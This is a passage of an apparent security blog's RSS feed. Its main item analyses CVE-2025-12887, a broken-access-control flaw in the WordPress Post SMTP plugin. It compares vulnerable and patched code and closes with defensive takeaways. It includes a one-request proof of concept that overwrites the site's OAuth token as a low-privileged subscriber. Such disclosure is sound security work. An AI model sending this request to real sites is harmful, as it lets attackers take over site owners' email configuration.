href=&#34;https://patchstack.com/database/wordpress/plugin/jetformbuilder/vulnerability/wordpress-jetformbuilder-plugin-3-5-3-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin &amp;lt;= 3.5.3 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12887 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-08-cve-2025-12887/</link>
      <pubDate>Mon, 08 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-08-cve-2025-12887/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-08-cve-2025-12887/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Post SMTP&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; is vulnerable to &lt;strong&gt;authorization bypass&lt;/strong&gt; in all versions up to and including &lt;strong&gt;3.6.1&lt;/strong&gt;. The issue arises because the plugin does not properly verify whether a &lt;strong&gt;user&lt;/strong&gt; is allowed to update the &lt;strong&gt;OAuth token&lt;/strong&gt; in the &lt;strong&gt;&lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt;&lt;/strong&gt; function. This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt;, with access as low as a &lt;strong&gt;subscriber&lt;/strong&gt; role or higher, to inject &lt;strong&gt;invalid or attacker-controlled OAuth credentials&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.6.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-smtp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – Post SMTP&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;admin_init&amp;#39;, array( $this, &amp;#39;handle_gmail_oauth_redirect&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;admin_init&lt;/code&gt; Hook&lt;/strong&gt;&#xA;This is a WordPress hook that is triggered &lt;strong&gt;every time a logged-in user accesses the admin area&lt;/strong&gt;. It runs early in the admin page initialization process, before any content is displayed.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Action registration&lt;/strong&gt;&#xA;The Post SMTP plugin registers the &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; function to the &lt;code&gt;admin_init&lt;/code&gt; hook. This means &lt;strong&gt;any logged-in user&lt;/strong&gt; (even a low-privileged user such as a &lt;em&gt;subscriber&lt;/em&gt;) can trigger this function simply by accessing an admin page.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The logic of &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; shows how the Post SMTP plugin processes &lt;strong&gt;OAuth tokens&lt;/strong&gt; from Gmail. However, there are critical weaknesses:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;A logged-in user only needs to access an admin page with the parameters &lt;code&gt;action=gmail_oauth_redirect&lt;/code&gt; and &lt;code&gt;access_token&lt;/code&gt; in the URL to trigger the update logic.&lt;/li&gt;&#xA;&lt;li&gt;There is &lt;strong&gt;no capability check&lt;/strong&gt; to ensure that only administrators are allowed to perform this action.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v3.6.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        &#xA;    // Capability check: Only allow administrators to update OAuth tokens&#xA;    if ( ! current_user_can( &amp;#39;manage_options&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // CSRF protection: Verify nonce (required by security report)&#xA;    if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || empty( $_GET[&amp;#39;_wpnonce&amp;#39;] ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Nonce is missing.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // Verify the nonce&#xA;    $nonce = sanitize_text_field( $_GET[&amp;#39;_wpnonce&amp;#39;] );&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;gmail_oauth_redirect&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Invalid nonce. Please try again.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;        &#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch introduces:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Capability check&lt;/strong&gt;&#xA;Only administrators (users with the &lt;code&gt;manage_options&lt;/code&gt; capability) are allowed to update the &lt;strong&gt;OAuth token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CSRF protection using a nonce&lt;/strong&gt;&#xA;A &lt;strong&gt;nonce verification&lt;/strong&gt; is added to ensure that the request actually originates from a legitimate WordPress page, preventing &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt; attacks.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access admin area: /wp-admin/&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;admin_init hook is triggered&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Post SMTP: handle_gmail_oauth_redirect() is executed&amp;#34;]&#xA;--&amp;gt; E{&amp;#34;Is GET[action] = gmail_oauth_redirect ?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits – No impact&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Read parameters from URL: access_token, refresh_token, expires_in, user_email&amp;#34;]&#xA;--&amp;gt; H{&amp;#34;Is access_token present ?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Build OAuth data array&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;postman_auth_token&amp;#39;, oauth_data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;OAuth token is overwritten by attacker-controlled data&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send the following request while authenticated as a &lt;strong&gt;Subscriber+&lt;/strong&gt; user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/?action=gmail_oauth_redirect&amp;amp;access_token=access_token_payload&amp;amp;refresh_token=refresh_to_payload&amp;amp;expires_in=expires_in_payload&amp;amp;user_email=user_email@gmail.com HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subscriber&amp;#43; cookie&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2025-12887 vulnerability stems from the Post SMTP plugin directly binding the &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; function to the &lt;code&gt;admin_init&lt;/code&gt; hook without performing any capability checks or additional authentication mechanisms. This allows any authenticated user, even with low privileges such as &lt;strong&gt;Subscriber/Contributor&lt;/strong&gt;, to send arbitrary requests that overwrite the &lt;code&gt;postman_auth_token&lt;/code&gt; value in the WordPress &lt;code&gt;options&lt;/code&gt; table.&lt;/p&gt;&#xA;&lt;p&gt;The absence of a &lt;strong&gt;capability check&lt;/strong&gt; and &lt;strong&gt;nonce verification&lt;/strong&gt; created a critical weakness in the OAuth handling workflow, potentially allowing attackers to take control over the site’s email sending configuration. This issue was resolved in version 3.6.2 by restricting execution to administrators and introducing nonce validation to prevent forged requests.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never attach sensitive actions (such as token updates) to general hooks like &lt;code&gt;admin_init&lt;/code&gt; without validating user privileges.&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;current_user_can()&lt;/code&gt; to ensure that only appropriate roles can perform high-risk actions.&lt;/li&gt;&#xA;&lt;li&gt;Enforce &lt;strong&gt;nonce verification&lt;/strong&gt; for any state-changing request to protect against CSRF.&lt;/li&gt;&#xA;&lt;li&gt;Do not trust data coming from &lt;code&gt;$_GET&lt;/code&gt; or &lt;code&gt;$_POST&lt;/code&gt; without proper authentication and authorization controls.&lt;/li&gt;&#xA;&lt;li&gt;Updating OAuth tokens should be treated as an administrative action and protected as strictly as other critical system changes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin &amp;lt;= 3.6.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11726 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-07-cve-2025-11726/</link>
      <pubDate>Sun, 07 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-07-cve-2025-11726/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  